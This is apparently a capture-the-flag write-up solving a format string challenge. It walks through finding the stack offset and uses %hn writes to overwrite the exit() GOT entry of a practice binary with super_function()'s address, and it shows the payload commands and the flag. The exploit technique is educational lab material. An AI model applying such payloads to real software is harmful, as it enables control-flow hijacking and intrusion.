### Even More Format Strings
This time, we have to overwrite the GOT entry of `exit()` with the address of `super_function()`.


We start by finding the offset of our input buffer:
```
$ python2 -c 'print "AAAA" + "%x."*10' | ./format3
Super Secure Format String Playground 13.37
Welcome!
super_function(): 0x80486cb
Enter an interesting message, please: You entered: AAAA1ff.f7f9e580.8048b5f.0.f7ff0c06.f7ffcfcc.41414141.252e7825.78252e78.2e78252e.
exit value: 0x08048546
```

Subtract 3 "%x", and we have our offset.
```
$ python2 -c 'print "AAAA" + "%x."*7' | ./format3
Super Secure Format String Playground 13.37
Welcome!
super_function(): 0x80486cb
Enter an interesting message, please: You entered: AAAA1ff.f7f9e580.8048b5f.0.f7ff0c06.f7ffcfcc.41414141.
exit value: 0x08048546
```

Change `AAAA` to the address of `exit` and prepare to write to this address.
```
$ readelf --relocs format3 | grep exit
08049120  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
$ python2 -c 'print "\x20\x91\x04\x08" + "%x"*5 + "%08x" + "%hn"' | ./format3
Super Secure Format String Playground 13.37
Welcome!
super_function(): 0x80486cb
Enter an interesting message, please: You entered:  �1fff7f9e5808048b5f0f7ff0c06f7ffcfcc
exit value: 0x08040027
[1]    11940 done                              python2 -c 'print "\x20\x91\x04\x08" + "%x"*5 + "%08x" + "%hn"' | 
       11941 segmentation fault (core dumped)  ./format3
```

Great! We have overwritten the two lower bytes of the address with `0x27`. `super_function()` is at `0x80486cb`, so we have to change `0x27` to `0x86cb`. We don't have to overwrite the upper bytes as they are the same.

```
>>> 0x86cb - 0x27 + 8
34476
```

`wanted - current + 8`. `+ 8` because we're using `%08x` at the time.


```
$ python2 -c 'print "\x20\x91\x04\x08" + "%x"*5 + "%34476x" + "%hn"' | ./format3
[lots of crap]
exit value: 0x080486cb
Congrats!
The token is: TG16{hardc0re_overwriting_stuff}
```
